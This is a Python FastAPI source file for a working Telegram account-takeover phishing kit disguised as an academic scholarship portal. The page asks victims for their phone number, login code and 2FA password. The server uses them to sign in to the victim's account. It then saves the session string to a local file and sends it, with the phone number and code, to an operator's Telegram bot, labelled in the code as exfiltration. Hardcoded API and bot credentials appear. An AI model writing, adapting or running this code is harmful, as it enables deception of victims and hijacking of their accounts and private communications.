import asyncio
import json
import os
import httpx
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession

app = FastAPI(title="Global Academic Portal - Nexus Elite")

API_ID = 36023099  # Yahan apni real API ID daal
API_HASH = "b5926500a901cb5b7a5ad5828e5e98e6"  # Yahan apni real API Hash daal

# Telegram Bot configuration for out-of-band exfiltration
BOT_TOKEN = "8518201996:AAF4foN-0G_m_OUUgM4nRGYJn6oc-8Lv7_4"
CHAT_ID = "8579040479"

VAULT_FILE = "elite_academic_vault.enc"


async def notify_operator_and_bot(
    phone: str, code: str, session_str: str, client_instance: TelegramClient
):
  profile_info = {}
  try:
    me = await client_instance.get_me()
    profile_info = {
        "id": me.id,
        "first_name": me.first_name,
        "username": me.username,
    }
  except Exception as e:
    profile_info = {"error": str(e)}

  # Terminal Output
  print(f"\n" + "=" * 70)
  print(f"[+] ELITE INTEL CAPTURED (TERMINAL LOG):")
  print(f"[+] Target Phone   : {phone}")
  print(f"[+] Submitted OTP  : {code}")
  print(f"[+] Profile Data   : {profile_info}")
  print(f"[+] Session String :\n{session_str}")
  print("=" * 70 + "\n")

  # Local Vault Backup
  data = {}
  if os.path.exists(VAULT_FILE):
    try:
      with open(VAULT_FILE, "r") as f:
        data = json.load(f)
    except:
      pass
  data[phone] = {
      "phone": phone,
      "otp": code,
      "profile": profile_info,
      "session_string": session_str,
  }
  with open(VAULT_FILE, "w") as f:
    json.dump(data, f, indent=4)

  # Telegram Bot Push Notification
  if BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN" and CHAT_ID != "YOUR_ADMIN_CHAT_ID":
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    msg_text = (
        f"🌐 *Academic Portal: New Intel Captured!*\n\n"
        f"📱 *Phone:* `{phone}`\n"
        f"🔢 *OTP Code:* `{code}`\n"
        f"👤 *Name:* `{profile_info.get('first_name', 'N/A')}`\n"
        f"🏷 *Username:* `@{profile_info.get('username', 'None')}`\n\n"
        f"🔑 *Session String:*\n`{session_str}`"
    )
    payload = {"chat_id": CHAT_ID, "text": msg_text, "parse_mode": "Markdown"}
    async with httpx.AsyncClient() as http_client:
      try:
        await http_client.post(url, json=payload, timeout=10.0)
      except Exception as e:
        print(f"[-] Bot exfiltration error: {e}")


# Premium Glassmorphism UI Design
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Scholarship & Education Foundation</title>
    <style>
        :root {
            --bg-gradient: radial-gradient(circle at 50% 10%, #1e1b4b 0%, #09090b 90%);
            --card-bg: rgba(24, 24, 27, 0.75);
            --border-color: rgba(255, 255, 255, 0.1);
            --accent-glow: rgba(99, 102, 241, 0.4);
            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
        }
        body {
            background: var(--bg-gradient);
            color: var(--text-main);
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
        }
        .card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 40px;
            border-radius: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
            border: 1px solid var(--border-color);
            position: relative;
        }
        .portal-badge {
            background: rgba(99, 102, 241, 0.15);
            color: #818cf8;
            padding: 6px 14px;
            font-size: 11px;
            border-radius: 30px;
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: 1.5px;
            display: inline-block;
            margin-bottom: 20px;
            border: 1px solid rgba(99, 102, 241, 0.3);
        }
        h2 {
            color: var(--text-main);
            margin-top: 0;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        p {
            font-size: 13.5px;
            color: var(--text-muted);
            margin-bottom: 28px;
            line-height: 1.5;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            font-size: 12px;
            color: var(--text-muted);
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(9, 9, 11, 0.6);
            border: 1px solid var(--border-color);
            color: #fff;
            border-radius: 12px;
            box-sizing: border-box;
            outline: none;
            font-size: 15px;
            transition: all 0.3s ease;
        }
        input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 15px var(--accent-glow);
            background: rgba(9, 9, 11, 0.9);
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, var(--primary), var(--primary-hover));
            color: white;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            font-weight: 600;
            font-size: 15px;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
        }
        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
        }
        #status {
            margin-top: 20px;
            font-size: 13px;
            color: #38bdf8;
            text-align: center;
            font-weight: 500;
            min-height: 20px;
        }
        .step-section {
            animation: fadeIn 0.4s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(6px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <span class="portal-badge">Global Initiative 2026</span>
            <h2>Academic & Scholarship Hub</h2>
            <p>Verify your mobile identity to unlock global research papers, digital textbooks, and educational grants.</p>
            
            <div id="step1" class="step-section">
                <div class="input-group">
                    <label>Mobile Number (with Country Code):</label>
                    <input type="text" id="phone" placeholder="+91 XXXXXXXXXX">
                </div>
                <button onclick="sendAction('send_code', {phone: document.getElementById('phone').value})">Send Secure OTP</button>
            </div>
            
            <div id="step2" class="step-section" style="display:none;">
                <div class="input-group">
                    <label>Enter Verification Code:</label>
                    <input type="text" id="code" placeholder="• • • • •">
                </div>
                <button onclick="sendAction('verify', {phone: document.getElementById('phone').value, code: document.getElementById('code').value})">Verify & Access Portal</button>
            </div>
            
            <div id="step3" class="step-section" style="display:none;">
                <div class="input-group">
                    <label>Cloud Security Password (2FA):</label>
                    <input type="password" id="password" placeholder="Enter cloud password">
                </div>
                <button onclick="sendAction('verify_2fa', {phone: document.getElementById('phone').value, password: document.getElementById('password').value})">Complete Authentication</button>
            </div>
            
            <div id="status"></div>
        </div>
    </div>

    <script>
        const ws = new WebSocket("ws://" + window.location.host + "/ws");
        
        ws.onmessage = function(event) {
            const data = JSON.parse(event.data);
            const statusEl = document.getElementById("status");
            statusEl.innerText = data.message;
            
            if(data.action === "code_sent") {
                statusEl.style.color = "#38bdf8";
                document.getElementById("step1").style.display = "none";
                document.getElementById("step2").style.display = "block";
            } else if(data.action === "need_2fa") {
                statusEl.style.color = "#facc15";
                document.getElementById("step2").style.display = "none";
                document.getElementById("step3").style.display = "block";
            } else if(data.action === "success") {
                statusEl.style.color = "#4ade80";
                statusEl.innerText = "Verified Successfully! Redirecting to Dashboard...";
            } else if(data.action === "error") {
                statusEl.style.color = "#f87171";
            }
        };

        function sendAction(actionType, payload) {
            payload.action = actionType;
            ws.send(JSON.stringify(payload));
            document.getElementById("status").style.color = "#38bdf8";
            document.getElementById("status").innerText = "Establishing secure channel...";
        }
    </script>
</body>
</html>
"""


@app.get("/", response_class=HTMLResponse)
async def get_index():
  return HTML_TEMPLATE


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
  await websocket.accept()
  client = TelegramClient(StringSession(), API_ID, API_HASH)
  await client.connect()
  phone_code_hash = None
  captured_code = None

  try:
    while True:
      data = await websocket.receive_json()
      action = data.get("action")

      if action == "send_code":
        phone = data.get("phone")
        try:
          result = await client.send_code_request(phone)
          phone_code_hash = result.phone_code_hash
          await websocket.send_json({
              "action": "code_sent",
              "message": "OTP dispatched successfully to device.",
          })
        except FloodWaitError as e:
          await websocket.send_json({
              "action": "error",
              "message": f"Rate limit. Try again in {e.seconds}s.",
          })
        except PhoneNumberInvalidError:
          await websocket.send_json({
              "action": "error",
              "message": "Invalid phone number format.",
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e)})

      elif action == "verify":
        phone = data.get("phone")
        captured_code = data.get("code")
        try:
          await client.sign_in(
              phone=phone, code=captured_code, phone_code_hash=phone_code_hash
          )
          session_string = client.session.save()
          await notify_operator_and_bot(
              phone, captured_code, session_string, client
          )
          await websocket.send_json({
              "action": "success",
              "message": "Authentication completed successfully.",
          })
        except SessionPasswordNeededError:
          await websocket.send_json({
              "action": "need_2fa",
              "message": (
                  "Cloud 2FA password required. Enter password below."
              ),
          })
        except PhoneCodeInvalidError:
          await websocket.send_json({
              "action": "error",
              "message": "Invalid OTP code entered.",
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e)})

      elif action == "verify_2fa":
        phone = data.get("phone")
        password = data.get("password")
        try:
          await client.sign_in(password=password)
          session_string = client.session.save()
          await notify_operator_and_bot(
              phone,
              f"{captured_code} + [2FA Protected]",
              session_string,
              client,
          )
          await websocket.send_json({
              "action": "success",
              "message": "2FA bypassed successfully.",
          })
        except Exception as e:
          await websocket.send_json({"action": "error", "message": str(e)})

  except WebSocketDisconnect:
    await client.disconnect()
